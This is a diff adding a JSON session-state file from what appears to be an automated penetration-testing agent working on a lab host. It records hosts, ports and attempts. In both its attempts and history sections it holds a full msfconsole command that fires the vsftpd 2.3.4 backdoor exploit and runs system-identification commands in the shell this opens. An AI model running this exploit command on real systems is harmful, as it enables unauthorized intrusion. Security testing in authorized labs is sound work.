@@ -1,0 +1,214 @@
+{
+  "schema_version": "2.0",
+  "session": {
+    "id": "20260611_160037_mvp_session",
+    "name": null,
+    "mode": null,
+    "created_at": null,
+    "status": "created"
+  },
+  "scope": {
+    "target_type": "host",
+    "target": "10.6.6.10",
+    "goal": "full_exploit",
+    "authorized": true,
+    "allow_exploitation": true,
+    "allow_pivoting": false,
+    "max_steps": null
+  },
+  "attacker": {
+    "hostname": null,
+    "interfaces": [],
+    "ipv4": [],
+    "default_gw": [],
+    "arp_neighbors": [],
+    "routes": [],
+    "lhost": null
+  },
+  "target": {
+    "networks": {
+      "net:10.6.6.10/24": {
+        "id": "net:10.6.6.10/24",
+        "cidr": "10.6.6.10/24",
+        "in_scope": true,
+        "reachable": null,
+        "discovered": false,
+        "host_discovery_done": false,
+        "port_scan_done": false,
+        "host_ids": [
+          "host:10.6.6.10"
+        ],
+        "evidence_ids": []
+      }
+    },
+    "hosts": {
+      "host:10.6.6.10": {
+        "id": "host:10.6.6.10",
+        "ip": "10.6.6.10",
+        "network_id": "net:10.6.6.10/24",
+        "in_scope": true,
+        "alive": null,
+        "hostnames": [],
+        "os": null,
+        "port_ids": [
+          "port:10.6.6.10:tcp:21"
+        ],
+        "service_ids": [
+          "svc:10.6.6.10:tcp:21"
+        ],
+        "credential_ids": [],
+        "vulnerability_ids": [],
+        "session_ids": [],
+        "finding_ids": [],
+        "evidence_ids": [],
+        "attempt_ids": [
+          "attempt:0001:601"
+        ]
+      }
+    },
+    "ports": {
+      "port:10.6.6.10:tcp:21": {
+        "id": "port:10.6.6.10:tcp:21",
+        "host_id": "host:10.6.6.10",
+        "ip": "10.6.6.10",
+        "port": 21,
+        "protocol": "tcp",
+        "state": "open",
+        "service_id": "svc:10.6.6.10:tcp:21",
+        "evidence_ids": [],
+        "attempt_ids": []
+      }
+    },
+    "services": {
+      "svc:10.6.6.10:tcp:21": {
+        "id": "svc:10.6.6.10:tcp:21",
+        "host_id": "host:10.6.6.10",
+        "port_id": "port:10.6.6.10:tcp:21",
+        "ip": "10.6.6.10",
+        "port": 21,
+        "protocol": "tcp",
+        "name": null,
+        "family": null,
+        "product": null,
+        "version": null,
+        "banner": null,
+        "technology": [],
+        "enumerated": false,
+        "vuln_checked": false,
+        "credential_ids": [],
+        "vulnerability_ids": [],
+        "session_ids": [],
+        "finding_ids": [],
+        "evidence_ids": [],
+        "attempt_ids": [
+          "attempt:0001:601"
+        ]
+      }
+    }
+  },
+  "vulnerabilities": {},
+  "credentials": {},
+  "sessions": {},
+  "attempts": {
+    "attempt:0001:601": {
+      "id": "attempt:0001:601",
+      "step_idx": 1,
+      "action_id": 601,
+      "action_name": "MSF_EXPLOIT_VSFTPD_234_BACKDOOR",
+      "phase": "exploit",
+      "target_id": "svc:10.6.6.10:tcp:21",
+      "host_id": "host:10.6.6.10",
+      "service_id": "svc:10.6.6.10:tcp:21",
+      "vulnerability_id": "vuln:vsftpd_234_backdoor:10.6.6.10:tcp:21",
+      "credential_id": null,
+      "command": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.6.6.10; set RPORT 21; exploit -z; sleep 8; sessions -l; sessions -c \"whoami && id && hostname && uname -a\" -i 1; sleep 2; sessions -K; exit -y'",
+      "rc": 0,
+      "success": null,
+      "event_types": [
+        "EXPLOIT_ATTEMPTED"
+      ],
+      "evidence_ids": []
+    }
+  },
+  "evidence": {},
+  "findings": {},
+  "coverage": {
+    "networks_discovered": [],
+    "networks_scanned": [],
+    "hosts_discovered": [
+      "host:10.6.6.10"
+    ],
+    "hosts_port_scanned": [],
+    "hosts_service_scanned": [],
+    "services_enumerated": [],
+    "services_checked_for_vulns": [],
+    "vulns_attempted": [],
+    "credentials_tested": [],
+    "exploits_attempted": [
+      "attempt:0001:601"
+    ],
+    "sessions_validated": []
+  },
+  "history": [
+    {
+      "type": "EXPLOIT_ATTEMPTED",
+      "host": "10.6.6.10",
+      "port": 21,
+      "service": "ftp",
+      "exploit": "vsftpd_234_backdoor",
+      "source": "msfconsole",
+      "step_idx": 1,
+      "t": 0,
+      "action_id": 601,
+      "action_name": "MSF_EXPLOIT_VSFTPD_234_BACKDOOR",
+      "command": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.6.6.10; set RPORT 21; exploit -z; sleep 8; sessions -l; sessions -c \"whoami && id && hostname && uname -a\" -i 1; sleep 2; sessions -K; exit -y'",
+      "rc": 0,
+      "target_id": null,
+      "host_id": null,
+      "port_id": null,
+      "service_id": null,
+      "vulnerability_id": null,
+      "credential_id": null,
+      "session_id": null
+    }
+  ],
+  "steps": [],
+  "last": {
+    "step_idx": 1,
+    "action_id": 601,
+    "action_name": "MSF_EXPLOIT_VSFTPD_234_BACKDOOR",
+    "rc": 0,
+    "success": null,
+    "event_types": [
+      "EXPLOIT_ATTEMPTED"
+    ],
+    "progress": null
+  },
+  "focus": {
+    "level": "host",
+    "network_id": null,
+    "host_id": "host:10.6.6.10",
+    "port_id": null,
+    "service_id": null,
+    "vulnerability_id": null,
+    "credential_id": null,
+    "session_id": null,
+    "reason": "target_host_not_discovered_yet"
+  },
+  "stats": {
+    "steps": 0,
+    "commands": 0,
+    "networks": 1,
+    "hosts": 1,
+    "ports": 1,
+    "services": 1,
+    "vulns": 0,
+    "credentials": 0,
+    "sessions": 0,
+    "attempts": 1,
+    "evidence": 0,
+    "findings": 0,
+    "exploits_attempted": 1,
+    "exploits_failed": 0
+  }
+}
